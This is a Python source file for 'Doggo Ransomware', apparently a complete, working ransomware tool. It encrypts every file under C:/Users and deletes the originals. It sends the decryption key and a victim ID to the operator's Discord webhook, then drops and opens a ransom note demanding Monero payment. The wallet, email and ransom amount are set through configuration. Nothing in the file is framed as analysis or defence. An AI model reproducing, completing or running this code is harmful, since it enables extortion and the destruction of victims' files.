import os
import random
import string
import requests
import datetime
import errno
from cryptography.fernet import Fernet
from bin.config import Config

cc = Config()

target_directory = r'C:/Users' # Directory to encrypt
webhook_url = cc.get_ransomware_discord_webhook_url() # Discord Webhook URL
email_adr = cc.get_ransomware_email_adress() # Email Adress where your encryption key will be sent
monero_adr = cc.get_ransomware_monero_wallet_adress() # Monero Wallet Address
cash = cc.get_ransomware_amount_of_money() # Amount of money to receive

timestamp = datetime.datetime.now().isoformat()

def log_error(e):
    data = {
        "username": "Doggo Ransomware",
        "avatar_url": "https://cdn.discordapp.com/attachments/1148300902051090625/1148326216663842824/doggo.jpg",
        "embeds": [
            {
                "title": "Doggo Ransomware Error",
                "url": "https://github.com/gumbobr0t",
                "color": 0xFF3030,
                "fields": [
                    {
                        "name": "USER ID",
                        "value": f"`{user_id}`",
                        "inline": True
                    },
                    {
                        "name": "ERROR OCCURED",
                        "value": f"`{e}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "https://github.com/gumbobr0t"
                },
                "timestamp": timestamp
            }
        ]
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception:
        pass

characters = string.ascii_letters + string.digits
user_id = ''.join(random.choice(characters) for i in range(9)) # Creates random user ID

key = Fernet.generate_key() # Creates random AES key
cipher_suite = Fernet(key)

encryptedfiles = [] # Saves all encrypted files

ransom_note = f"""Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.

To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.

You can do this by sending ${cash} USD to this monero address:
{monero_adr}

Don't know how to get monero? Here are some websites:

https://www.coinbase.com/how-to-buy/monero
https://localmonero.co/?language=en
https://www.okx.com/buy-xmr

Once you have sent the ransom to the monero address you must write an email this this email address: {email_adr}

In this email you will include your personal ID so we know who you are. Your personal ID is: {user_id}

Once you have completeted all of the steps, you will be provided with the key to decrypt your files.

Don't know how ransomware works? Read up here:
https://www.trellix.com/en-us/security-awareness/ransomware/what-is-ransomware.html
https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/
https://www.trendmicro.com/vinfo/us/security/definition/Ransomware

Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the webhook will make it impossible, as the key can not be generated.

Good luck"""

def send_wh():
    data = {
        "username": "Doggo Ransomware",
        "avatar_url": "https://cdn.discordapp.com/attachments/1148300902051090625/1148326216663842824/doggo.jpg",
        "embeds": [
            {
                "title": "Doggo Ransomware Hit",
                "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks.",
                "url": "https://github.com/gumbobr0t",
                "color": 0x00FF00,
                "fields": [
                    {
                        "name": "USER ID",
                        "value": f"`{user_id}`",
                        "inline": True
                    },
                    {
                        "name": "TARGET DIR",
                        "value": f"`{target_directory}`",
                        "inline": True
                    },
                    {
                        "name": "DECRYPTION KEY",
                        "value": f"`{key.hex()}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "https://github.com/gumbobr0t"
                },
                "timestamp": timestamp
            }
        ]
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception:
        pass

    del key

def encrypt_file(file_path):
    encryptedfiles.append(file_path)

    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)

    encrypted_file_path = file_path + '.doggo.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    os.remove(file_path)

def encrypt_directory(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path)
            except OSError as e:
                if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                               errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                    pass  # Ignore permission/access errors
            except Exception as e:
                if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
                    pass  # Ignore common file errors
                else:
                    log_error(e)

def encrypted_files():
    try:
        with open('DOGGO-RANSOMWARE-ENCRYPTED-FILES.txt', 'w') as file:
            for encryptedfile in encryptedfiles:
                file.write(encryptedfile + '\n')
    except Exception as e:
        log_error(e)

def ransomware():

    send_wh()
    encrypt_directory(target_directory)
    encrypted_files()
    del cipher_suite

    try:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        file_path = os.path.join(desktop, 'DOGGO-RANSOMWARE-NOTE.txt')
        with open(file_path, 'w') as f:
            f.write(ransom_note)

        os.startfile(file_path)

    except Exception as e:
        log_error(e)